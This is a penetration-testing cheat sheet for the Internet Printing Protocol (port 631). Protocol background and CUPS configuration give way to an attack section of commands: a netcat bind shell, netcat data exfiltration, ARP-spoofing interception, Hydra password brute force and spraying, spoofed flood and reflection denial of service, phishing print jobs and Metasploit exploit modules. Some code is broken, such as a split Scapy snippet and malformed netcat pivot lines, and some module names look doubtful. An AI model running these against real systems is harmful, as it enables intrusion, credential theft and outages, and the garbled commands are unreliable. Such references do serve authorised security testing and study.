# P632 IPP

## Index

* \[\[Ports, Protocols, and Services]]

## Internet Printing Protocol (IPP)

* **Port Number:** 631
* **Protocol:** TCP/UDP
* **Service Name:** Internet Printing Protocol (IPP)
* **Defined in:** RFC 2910, RFC 2911

The Internet Printing Protocol (IPP) is a network protocol for communication between client devices and printers or print servers. IPP is designed to allow users to submit print jobs, inquire about the status of print jobs, and manage print jobs remotely. It is widely used due to its platform independence, security features, and extensibility. IPP is supported by most modern printers and is part of the Internet Engineering Task Force (IETF) standard protocols.

### Overview of Features

* **Cross-Platform Support:** IPP is platform-independent, meaning it works across different operating systems and printer types, making it a widely adopted standard.
* **Secure Communication:** IPP can use HTTP over TLS (HTTPS) to encrypt print job data and ensure secure transmission between client and server, protecting sensitive information.
* **Job Management:** Users can query the status of print jobs, cancel jobs, and manage printer queues through IPP.
* **Extensibility:** IPP is highly extensible, allowing for additional functionalities like printer discovery, driver management, and advanced job control features.
* **Bidirectional Communication:** IPP supports two-way communication, enabling clients to receive feedback and status updates from the printer, such as paper out, toner low, or job completion.
* **Embedded in Modern Systems:** IPP is embedded in most modern operating systems and network printers, making it a ubiquitous protocol in office environments.

### Typical Use Cases

* **Remote Printing:** Users can submit print jobs to networked printers from remote locations, ensuring flexibility in printing workflows.
* **Enterprise Print Management:** Organizations use IPP to manage large-scale print jobs and printer fleets, allowing centralized control over printing resources.
* **Cloud Printing Services:** IPP forms the backbone of many cloud printing services, where print jobs are submitted over the internet to remote printers.
* **Mobile Printing:** With the advent of mobile devices, IPP supports printing directly from smartphones and tablets to compatible printers.

### How IPP Works

1. **Client Discovery:**
   * **Step 1:** The client discovers available printers using a service discovery protocol like DNS-SD (DNS Service Discovery) or mDNS (Multicast DNS). This can happen automatically or manually based on user input.
2. **Connection Establishment:**
   * **Step 2:** The client establishes a TCP connection to the printer or print server on port 631. If secure communication is required, this is done over HTTPS.
3. **Job Submission:**
   * **Step 3:** The client formats the print job data according to IPP specifications, typically using MIME types like `application/pdf`, `application/postscript`, or `application/octet-stream`.
   * **Step 4:** The client sends an IPP request to submit the print job, which includes the job data and any relevant attributes (e.g., number of copies, page range).
4. **Job Processing:**
   * **Step 5:** The printer or print server processes the print job, potentially queueing it if other jobs are ahead. The server returns a job ID and status information to the client.
5. **Job Monitoring:**
   * **Step 6:** The client can periodically query the print server for the status of the submitted job using the job ID. This allows users to check if the job is printing, pending, or completed.
6. **Job Management:**
   * **Step 7:** The client can send additional IPP requests to manage the job, such as canceling it or modifying attributes (e.g., changing the number of copies). The server updates the job accordingly and returns the new status.
7. **Job Completion:**
   * **Step 8:** Once the job is printed, the server notifies the client of the job's completion. The client may also receive notifications about errors or other events during printing (e.g., paper jam).
8. **Connection Termination:**
   * **Step 9:** The client closes the TCP connection once all interactions with the printer are complete.

#### Diagram (Hypothetical Example)

* **Client:** `<attack_ip>` sends a print job to `<target_ip>`:631.
* **Server:** `<target_ip>` receives the job, queues it, and starts printing.
* **Client:** `<attack_ip>` queries the status of the job until it is completed.

## Additional Information

### Security Considerations

* **TLS Support:** IPP supports TLS for secure communication, ensuring that print jobs are encrypted during transmission. This is crucial for protecting sensitive documents in transit.
* **Access Control:** IPP implementations often include access control mechanisms, allowing administrators to restrict who can submit jobs or manage printers.
* **Potential for Misuse:** Open IPP ports can be an entry point for attackers if not properly secured. Unauthenticated access to printers could lead to unauthorized print jobs, information disclosure, or even denial of service.

### Alternatives

* **Line Printer Daemon (LPD):** An older protocol for print services, still in use but lacking the advanced features and security of IPP.
* **Server Message Block (SMB):** Commonly used in Windows environments for file and printer sharing, SMB is another alternative but is generally less secure and more complex to configure.
* **JetDirect (Port 9100):** A raw socket printing protocol used by HP printers, offering faster processing but lacking the extensibility and security of IPP.

### Advanced Usage

* **IPP Everywhere:** A newer extension of IPP that allows for driverless printing across different devices and platforms, reducing the need for vendor-specific drivers.
* **Cloud-Based IPP:** IPP can be used in conjunction with cloud services to allow remote job submission to printers located in different geographic locations.

### Modes of Operation

* **Synchronous Mode:** IPP generally operates in a synchronous mode where the client waits for a response from the server before proceeding to the next step.
* **Asynchronous Mode:** Some implementations may allow asynchronous operations where job submission and status polling happen in parallel, improving efficiency in high-volume environments.

### Configuration Files

IPP is typically configured through the print server software or operating system. Commonly, CUPS (Common UNIX Printing System) is used to manage IPP services on Unix-like systems.

1. **CUPS Configuration:**

* **File Location:** `/etc/cups/cupsd.conf`
*   **Configuration Example:**

    ```bash
    Listen localhost:631
    Listen /var/run/cups/cups.sock
    DefaultEncryption IfRequested
    <Location /admin>
        AuthType Default
        Require user @SYSTEM
        Order allow,deny
        Allow localhost
    </Location>
    ```
* **Key Settings:**
  * `Listen`: Specifies the IP addresses and ports on which CUPS should listen for IPP requests.
  * `DefaultEncryption`: Defines whether encryption is required for IPP communications.
  * `AuthType` and `Require`: Manage access control for administrative functions.
  * `Order allow,deny`: Configures access rules for different locations (e.g., administrative interfaces).

### Potential Misconfigurations

1. **Open IPP Port on Public Network:**
   * **Risk:** Exposing IPP on port 631 to the internet can allow unauthorized users to submit print jobs or manage printers, leading to potential abuse or data leaks.
   * **Exploitation:** Attackers could submit large or malicious print jobs, leading to service disruption or wastage of resources.
2. **Weak or No Authentication:**
   * **Risk:** If authentication is not properly configured, anyone on the network might be able to access and control printers.
   * **Exploitation:** Attackers could reconfigure printers, change settings, or access sensitive print jobs.
3. **Lack of Encryption:**
   * **Risk:** If TLS is not enabled, print jobs are sent in clear text, making them vulnerable to interception and modification.
   * **Exploitation:** An attacker could capture and modify print jobs, leading to information disclosure or sabotage.

### Default Credentials

IPP itself does not define credentials, as it is generally integrated with the operating system’s authentication mechanisms. However, in systems like CUPS, default credentials or weak passwords may be used, particularly if the printer is not properly secured.

* **Username:** `root`, `admin`
* **Password:** `<system password>`

These credentials are often tied to the system’s root or administrative user accounts. It’s crucial to change default passwords and enforce strong authentication methods.

## Interaction and Tools

### Tools

#### \[\[LP]]

*   **Submit a Print Job:** Submits a print job to the specified printer.

    ```bash
    lp -d <printer_name> <file_to_print>
    ```
*   **Secure Print Job Submission:** Submits a print job with authentication and encryption, ensuring secure transmission.

    ```bash
    lp -d <printer_name> -o job-sheets=none -o auth-info-required=username,password -o auth-username=<username> -o auth-password=<password> <file_to_print>
    ```
*   **Modify Print Job:** Modifies an existing print job’s options, such as the number of copies or the page range.

    ```bash
    lp -i <job_id> -o <option>=<value>
    ```
*   **Check IPP Service:** Checks if the CUPS server is running and available to handle IPP requests.

    ```bash
    lpstat -r
    ```
*   **List Available Printers:** Displays all printers configured on the system and shows the default printer.

    ```bash
    lpstat -p -d
    ```
*   **Check Job Status:** Lists all print jobs and their current status.

    ```bash
    lpstat -o
    ```
*   **Query Job Status:** Retrieves the status of print jobs on the specified printer.

    ```bash
    lpstat -p <printer_name>
    ```
*   **Cancel a Print Job:** Cancels the specified print job.

    ```bash
    cancel <job_id>
    ```
*   **Manage IPP printers and jobs:** Adds a new IPP printer to the CUPS system.

    ```bash
    lpadmin -p <printer_name> -E -v ipp://<printer_ip>/printers/<printer_name>
    ```
*   **Enable/Disable Printer:** Disables or enables a printer for accepting jobs.

    ```bash
    cupsdisable <printer_name>
    cupsenable <printer_name>
    ```

#### \[\[CUPS]]

*   **Enable Remote Admin:** Enables remote administration of CUPS via IPP, allowing configuration and management of printers and jobs.

    ```bash
    cupsctl --remote-admin
    ```

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "tcp port 631"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p 631
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 631
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 631 -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> 631
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> 631 < secret_data.txt
    ```

#### \[\[SoCat Cheat Sheet]]

*   **Socat TCP Connect:** Simple tests to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:631
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send UDP Packet:** Send a single UDP packet to the service.

    ```bash
    hping3 -2 <target_ip> -p 631 -c 1
    ```

### Other Techniques

#### CUPS Web Interface

*   **Browser Interface:** The CUPS web interface allows for remote management of printers and jobs.

    ```bash
    http://<target_ip>:631/admin
    ```

## Penetration Testing Techniques

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 631
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 631
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

\


*   **Tool:** \[\[IPPTool]]

    ```bash
    ipptool -tv ipp://<target_ip>:631/printers/<printer_name> get-printer-attributes.test
    ```
* **Description:** Enumerate the capabilities and status of an IPP printer.

### Initial Access

#### Exploiting Open IPP Service

*   **Tool:** \[\[Metasploit]]

    ```bash
    use auxiliary/scanner/cups/cups_enum
    ```
* **Description:** Leverages vulnerabilities in the IPP service or CUPS configuration to gain unauthorized access.

#### Exploiting Unsecured IPP Service

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/unix/lpd/cups_job
    set RHOST <target_ip>
    run
    ```
* **Description:** Exploit vulnerabilities in the IPP service to gain initial access to the network or system.

#### Unauthenticated Job Submission

*   **Tool:** CUPS Web Interface

    ```bash
    curl -k -d "job-name=ExploitTest" "http://<target_ip>:631/printers/<printer_name>"
    ```
* **Description:** Submits unauthorized print jobs if the IPP service is not properly secured.

### Persistence

#### Create Persistent Print Jobs

*   **Tool:** \[\[LP]]

    ```bash
    lp -d <printer_name> -o job-retain-until=indefinite <file_to_print>
    ```
* **Description:** Creates persistent print jobs that stay in the queue indefinitely, potentially as a beacon or signal.

#### Hidden Print Jobs

*   **Tool:** \[\[IPPTool]]

    ```bash
    lp -d <printer_name> -o job-sheets=none <file>
    ```
* **Description:** Submit hidden or unauthorized print jobs that are not immediately visible in the queue.

#### Backdoor via IPP

*   **Tool:** \[\[NetCat]]

    ```bash
    nc -l -p 631 -e /bin/sh
    ```
* **Description:** Use the IPP service as a backdoor to maintain persistent access to the network.

### Credential Harvesting

#### Packet Capture

*   **Tool:** \[\[Wireshark]]

    ```bash
    wireshark -i <interface> -f "tcp port 631"
    ```
* **Description:** Capture traffic and extract plaintext credentials.

#### Man-in-the-Middle (MITM) Attack

*   **Tool:** \[\[ettercap]], \[\[BetterCap Cheat Sheet]]

    ```bash
    ettercap -Tq -i <interface> -M arp:remote /<target_ip>/ /<server_ip>/
    ```
* **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

#### Phishing via IPP

*   **Tool:** \[\[LP]]

    ```bash
    lp -d <printer_name> -o job-name="Security Alert: Update Required" <phishing_file>
    ```
* **Description:** Submit a phishing print job that prompts users to enter credentials or visit a malicious website.

### Privilege Escalation

#### Exploit CUPS Misconfigurations

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/unix/misc/cups_root_file_read
    ```
* **Description:** Exploits CUPS configuration vulnerabilities to gain elevated privileges on the target system.

#### Abusing Elevated IPP Services

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/unix/lpd/cups_job
    set RHOST <target_ip>
    run
    ```
* **Description:** Exploit IPP services running with elevated privileges to escalate access on the target system.

#### Abuse of IPP Administration

*   **Tool:** CUPS Web Interface

    ```bash
    http://<target_ip>:631/admin
    ```
* **Description:** Gain administrative access to CUPS via misconfigured authentication settings.

### Internal Reconnaissance

#### Printer Enumeration

*   **Tool:** \[\[IPPTool]]

    ```bash
    ipptool -tv ipp://<target_ip>:631/printers/<printer_name> get-printer-attributes.test
    ```
* **Description:** Gather detailed information about network printers, potentially revealing sensitive configurations or documents.

### Lateral Movement, Pivoting, and Tunnelling

#### Pivoting through IPP

*   **Tool:** \[\[NetCat]]

    ```bash
    nc -lvp 8080 -e lp -d <printer_name> <file_to_print>
    ```
* **Description:** Uses IPP to establish a covert channel or pivot point within the network.

### Defense Evasion

#### Hiding Malicious Jobs in Queue

*   **Tool:** \[\[LP]]

    ```bash
    lp -d <printer_name> -o job-hold-until=indefinite <file_to_print>
    ```
* **Description:** Submits a job that remains in the queue indefinitely, potentially hiding malicious activity from administrators.

### Data Exfiltration

#### Exfiltrating Data via Print Jobs

*   **Tool:** \[\[LP]]

    ```bash
    lp -d <printer_name> <file_to_exfiltrate>
    ```
* **Description:** Covertly exfiltrate data by embedding it in print jobs sent to remote or compromised printers.

#### Covert Channels via IPP

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 631 -e lp -d <printer_name>
    ```
* **Description:** Establish a covert communication channel using IPP as a carrier for exfiltrated data.

## Exploits and Attacks

### Password Attacks

#### Password Brute Force

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra <protocol>://<target_ip> -s <target_port> -l <username> -P <password_list>
    ```
* **Description:** Test a single username against multiple passwords.

#### Password Spray

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra <protocol>://<target_ip> -s <target_port> -l <username_list> -P <password>
    ```
* **Description:** Test a multiple usernames against a single password.

#### Brute force IPP Web Interface

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra -l <username> -P <password_list> <target_ip> http-post-form "/printers:username=^USER^&password=^PASS^:F=failed" -V
    ```
* **Description:** Brute-force the IPP management interface (e.g., CUPS) to gain unauthorized access.

#### Password Spray IPP Web Interface

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra -l <username_list> -P <password> <target_ip> http-post-form "/printers:username=^USER^&password=^PASS^:F=failed" -V
    ```
* **Description:** Brute-force the IPP management interface (e.g., CUPS) to gain unauthorized access.

### Denial of Service

#### TCP/UPD Flood Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

#### IPP Flooding via Jobs

*   **Tool:** \[\[Custom Scripts]], \[\[LP]]

    ```bash
    while true; do lp -d <printer_name> <file_to_print>; done
    ```
* **Description:** Overloads the printer or print server with an excessive number of print jobs, leading to a denial of service.

#### Spooling Overflow Attack

*   **Tool:** \[\[LP]]

    ```bash
    lp -d <printer_name> -n 100000 <large_file>
    ```
* **Description:** Submit a large number of print jobs or extremely large files to overwhelm the printer’s spooling capacity, leading to a service disruption.

#### Malformed IPP Request

*   **Tool:** \[\[Scapy]]

    ```python
    from scapy.all import *
    packet = IP(dst="<target_ip>")/TCP(dport=631)/Raw(load="\x00
    ```

\x01\x02\x03\x04") send(packet) \`\`\`

* **Description:** Sends malformed IPP requests to crash or disrupt the print service.

### Exploits

#### CUPS Heap Overflow

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/unix/misc/cups_overflow
    ```
* **Description:** Exploits a heap overflow vulnerability in CUPS to execute arbitrary code with elevated privileges.

#### IPP Response Spoofing

*   **Tool:** \[\[Scapy]]

    ```python
    from scapy.all import *
    packet = IP(dst="<target_ip>")/TCP(dport=631)/Raw(load="fake_response")
    send(packet)
    ```
* **Description:** Spoofs IPP responses to manipulate the output or behavior of print jobs.

## Resources

| **Website**           | **URL**                                             |
| --------------------- | --------------------------------------------------- |
| RFC 2910              | https://tools.ietf.org/html/rfc2910                 |
| RFC 2911              | https://tools.ietf.org/html/rfc2911                 |
| CUPS Documentation    | https://www.cups.org/documentation.php              |
| IPP Everywhere        | https://www.pwg.org/ipp/everywhere.html             |
| Nmap Scripting Engine | https://nmap.org/nsedoc/                            |
| Metasploit Framework  | https://www.metasploit.com                          |
| Wireshark User Guide  | https://www.wireshark.org/docs/wsug\_html\_chunked/ |
| Scapy Documentation   | https://scapy.readthedocs.io/en/latest/             |
| Hydra                 | https://github.com/vanhauser-thc/thc-hydra          |
| Linux man-pages       | https://man7.org/linux/man-pages/                   |
